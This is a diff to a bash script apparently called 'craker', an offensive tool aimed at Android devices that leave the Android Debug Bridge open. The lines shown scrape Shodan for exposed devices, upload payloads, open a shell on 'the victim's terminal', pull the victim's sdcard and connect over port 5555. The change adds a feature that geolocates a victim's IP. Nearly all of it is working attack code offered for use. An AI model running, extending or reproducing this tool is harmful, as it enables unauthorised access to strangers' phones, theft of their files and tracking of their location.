@@ -1,21 +1,4 @@
 #!/bin/bash
-trap ctrl_c INT
-ctrl_c(){
-echo -en "\e[0mDo you want to get out of craker ? \e[2my/n\e[0m "
-read e
-
-if [[ $e == "y" ]]
-then
-echo -e "\e[31mExiting..\e[0m"
-sleep 1
-exit
-elif [[ $e == "n" ]]
-then
-craker
-else
-ctrl_c
-fi
-}
 
 banner(){
 echo -e "
@@ -38,6 +21,7 @@ elif [[ $@ == "--adb" ]]
 then
 banner 35
 echo -e "adb: --find \e[2mFind vulnerable ip\e[0m"
+echo -e "adb: --location <ip> \e[2mFind location ip\e[0m"
 echo -e "adb: --upload <paylaod> \e[2mUpload payload\e[0m"
 echo -e "adb: --shell \e[2mConnect to the victim's terminal\e[0m"
 echo -e "adb: --download <sdcard> <directory> \e[2mDownload sdcard\e[0m"
@@ -53,7 +37,14 @@ then
 echo -e "\e[34m[+]\e[0m Looking for vulnerable ip "
 curl -s "https://www.shodan.io/search?query=Android+Debug+Bridge" -o androids.txt
 cat androids.txt | grep "host" | awk '{print $3}' >> dumps.txt
-cat dumps.txt | grep "host" | tr '""<>/=' " " | awk '{print $3}'
+cat dumps.txt | grep "host" | tr '""<>/=' " " | awk '{print $3}' 
+rm *.txt
+elif [[ $2 == "--location" ]]
+then
+echo -e "\e[34m[+]\e[0m Looking for location"
+curl -s "https://ipapi.co/$3/json" -o ip.txt
+geo=$(cat ip.txt | grep "country_name" | tr ',""' " " | awk '{print $3 $4}')
+echo -e "Ip: \e[34m$3\e[0m\nLocation: \e[34m$geo\e[0m"
 rm *.txt
 elif [[ $2 == "--upload" ]]
 then
@@ -72,7 +63,7 @@ adb pull -p -a $3 $4
 elif [[ $2 == "--connect" ]]
 then
 echo -e "\e[34m[+]\e[0m Connect device $3 "
-adb connect $3:5555
+adb connect $3:5555 
 elif [[ $2 == "--disconnect" ]]
 then
 echo -e "\e[34m[+]\e[0m Disconnect devices"
